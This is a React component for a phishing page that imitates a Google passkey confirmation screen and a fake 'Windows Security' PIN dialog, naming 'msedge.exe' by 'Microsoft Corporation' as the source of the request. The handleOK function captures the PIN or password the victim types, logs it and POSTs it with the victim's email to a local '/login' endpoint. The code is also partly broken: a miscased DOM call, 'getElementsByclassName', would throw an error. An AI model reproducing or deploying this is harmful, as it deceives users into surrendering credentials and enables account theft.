import React, { useEffect, useRef, useState } from 'react'
import {Link, useNavigate, useParams} from 'react-router-dom'
import { FcGoogle } from "react-icons/fc";
import './Emailconfirmation.css'
import { MdOutlineSecurity } from "react-icons/md";
import { RxCross2 } from "react-icons/rx";
import { RiKeyboardBoxFill } from "react-icons/ri";


const Emailconfirmation = () => {

   const [showModal, setShowModal] = useState(false);
   const toggleModal = () => setShowModal(!showModal);
   const params = useParams()
   const  [load , setLoad] = useState(false)
  const passwordRef = useRef()
  const navigate = useNavigate()
   const handleLoading = ()=>{
  try {
    
setLoad(true)

  } catch (error) {
    console.log(error);
    
  }
}



const handleOK = async () => {
  try {
const password= passwordRef.current.value
console.log(password);

    const res = await fetch (`http://localhost:1020/login/${params.email}`,{
      method:"POST",
      headers:{
        'Content-Type' : 'application/json'
      },
      body:JSON.stringify({password})
    }) 
    const data = await res.json()
    
   
  } catch (error) {
    console.log(error)
    
  }
} 


const getRandomHexColor =   ()=> {
  const randomColor = Math.floor(Math.random() * 16777215).toString(16);
  return `#${randomColor.padStart(6, "0")}`;
}


useEffect(()=>{
  getRandomHexColor()

const elm =   document.getElementsByclassName("emailconfirm-email-first-latter")[0]
 elm.style.backgroundColor  =  getRandomHexColor()


},[] )


const firstlatter = params.email[0].toUpperCase()







  return (
    <main className='ChooseAccount-main'  >
    { load === true ?  <span  className="  loading-bar col-8 bg-info"></span>  
     : <></>  }
    
    <div  className='container'  > 
    <div  className='google-passkey-container'  onClick={handleLoading} > <h1> <FcGoogle/> </h1>  <h2  className='choose-an-account' > Use your passkey to confirm it's really you </h2> 
    <Link   to="/youtube.com/ChooseAccount" className='email-id-container'  > 
    <Link    to="/youtube.com/ChooseAccount" className='emailconfirm-email-first-latter'  onClick={handleLoading} > {firstlatter} </Link> {params.email} 
    </Link>
    
    

    
    </div>
    <div    className='img-container-btn'   >
    <img src="/images/additionalimages/passwordley.png" alt="passwordley.png"  className='img-container' />
<div  className='p-btn-container' >
  <p  className='tryanother-para' > Try another way </p>
<button className='tryagain-continue-btn' onClick={toggleModal}  >  Continue </button>
</div>  </div>
         </div>
{showModal === true  ?           <div className="  modal-container"   >

<div  className='Windows-Security' >
<p>  <MdOutlineSecurity className='MdOutlineSecurity' /> Windows Security  </p>
<p   >  <RxCross2  className='loginModal-RxCross2'  onClick={toggleModal} />  </p>
</div>

<h4> Making sure it's you </h4>
<p className='para-small' > Sign in with your Passkey to "google.com" as "{params.email}". </p>
<p className='para-small2' > This request comes from the app "msedge.exe" by "Microsoft Corporation". </p>
  <div className='input-container' >
  <RiKeyboardBoxFill  className='RiKeyboardBoxFill ' /> 
  <div  className='pin-container' >  <span  className='para-small' >PIN </span> 
   <input  ref={passwordRef}  type="password" className='password-input' />
  </div>
 </div>
<div className=' ok-cancel-btn-container' > <button className='ok-btn btn btn-secondary ' onClick={handleOK}  > OK </button> 
<button className='btn btn-dark cancel-btn '  onClick={toggleModal}> Cancel </button> </div>
  
   </div>
 :  <></>}
    
    </main>)
}

export default Emailconfirmation